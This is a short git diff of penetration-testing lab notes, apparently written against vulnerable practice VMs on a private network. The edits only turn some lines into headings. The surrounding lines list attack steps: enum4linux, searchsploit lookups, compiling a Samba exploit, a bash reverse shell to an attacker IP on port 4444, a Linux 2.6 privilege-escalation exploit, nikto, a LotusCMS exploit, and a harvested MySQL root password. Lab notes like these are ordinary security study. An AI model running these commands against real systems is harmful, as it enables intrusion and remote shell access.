@@ -1,7 +1,7 @@
 #### --Level 1-- 
 enum4linux      192.168.139.128
 
-**** searchsploit Samba 2.2
+##### searchsploit Samba 2.2
 
 gcc /usr/share/exploitdb/exploits/multiple/remote/10.c -o exploitsamba
 
@@ -17,7 +17,7 @@ Welcome to the Basic Administrative Web Console
 
 bash -i >& /dev/tcp/192.168.139.129/4444 0>&1
 
-searchsploit Linux 2.6 Privilege Escalation CentOS
+##### searchsploit Linux 2.6 Privilege Escalation CentOS
 
 cp /usr/share/exploitdb/exploits/linux/local/9545.c 
 
@@ -31,7 +31,7 @@ show databases;
 
 nikto -host 192.168.139.131
 
-LotusCMS-Exploit
+##### LotusCMS-Exploit
 
 	$GLOBALS["gallarific_mysql_username"] = "root";
 	$GLOBALS["gallarific_mysql_password"] = "fuckeyou";
